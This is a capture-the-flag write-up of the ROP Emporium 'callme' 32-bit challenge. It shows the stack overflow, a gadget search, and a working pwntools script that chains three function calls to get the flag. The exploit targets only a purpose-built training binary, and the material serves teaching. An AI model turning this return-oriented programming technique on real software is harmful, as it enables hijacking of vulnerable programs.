# callme - 32 Bit
Program execution:
```
callme by ROP Emporium
x86

Hope you read the instructions...

> <input_here>
```
Run checksec: `checksec ./callme32`
```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Same as usual, `main` calls `pwnme` which has a buffer overflow vulnerability due to unsafe usage of `read`. In this case 0x200 bytes can be read into a 32 byte buffer starting at address `ebp-0x28`:
```assembly
sub     esp, 0x4
push    0x200 {var_34}
lea     eax, [ebp-0x28 {var_2c}]
push    eax {var_2c} {var_38}
push    0x0
call    read
```
With the knowledge we can control code flow, we can go about following the given instructions. We need to call `callme_one`, `callme_two` and `callme_three`. For each call there are 3 parameters: `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`.

To do the first function call we know we can structure our payload as:
* 0x2c bytes of padding
* p32(`callme_one` address)
* function to call after `callme_one` finishes
* `0xdeadbeef`
* `0xcafebabe`
* `0xd00df00d`

However, we can't just put the address of `callme_two` as the return address for `callme_one` because then the return address of `callme_two` would be `0xdeadbeef` and the first argument would be `0xcafebabe`. So instead, we need a ROP gadget that will pop all the arguments off the stack (3 args) and then `ret` into next address which we will set as the address of `callme_two`. Let's find a suitable gadget with `ropper`.
`ropper -f callme32 --search 'pop'`:
```
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: callme32
0x080487fb: pop ebp; ret;
0x080487f8: pop ebx; pop esi; pop edi; pop ebp; ret;
0x080484ad: pop ebx; ret;
0x080487fa: pop edi; pop ebp; ret;
0x080487f9: pop esi; pop edi; pop ebp; ret;
0x08048810: pop ss; add byte ptr [eax], al; add esp, 8; pop ebx; ret;
0x080486ea: popal; cld; ret;
```
We need to pop 3 items off the stack, so `pop esi; pop edi; pop ebp; ret;` looks like a good fit for us to use as the gadget to return to, from `callme_one`.
Then we repeat this structure to call the other two functions.

Exploit script:
```python
#!/usr/bin/python3

from pwn import *

PROG_NAME = "./callme32"

p = process(PROG_NAME)
elf = p.elf
rop = ROP(elf)

if args.ATTACH:
	gdb.attach(p, '''break main''')

pop_esi_edi_ebp_addr = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

p.recvuntil(b'> ')

payload = b'A' * (0x28 + 0x4)

for func in ['callme_one', 'callme_two', 'callme_three']:
	payload += p32(elf.symbols[func])
	payload += p32(pop_esi_edi_ebp_addr)
	payload += p32(0xdeadbeef)
	payload += p32(0xcafebabe)
	payload += p32(0xd00df00d)

p.sendline(payload)

p.interactive()
```

And we get the flag:
```
Thank you!
callme_one() called correctly
callme_two() called correctly
ROPE{a_placeholder_32byte_flag!}
```
